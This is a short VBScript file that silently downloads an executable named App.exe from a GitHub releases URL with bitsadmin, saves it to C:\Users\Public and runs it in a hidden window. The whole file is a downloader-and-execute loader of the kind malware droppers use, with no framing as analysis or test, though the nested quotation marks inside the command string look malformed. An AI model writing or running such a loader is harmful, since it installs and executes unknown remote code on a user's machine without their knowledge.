Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c bitsadmin /transfer myjob /download /priority high "https://github.com/rootterminator/App/releases/download/app/App.exe" C:\Users\Public\app.exe && cmd /c C:\Users\Public\app.exe", 0, False
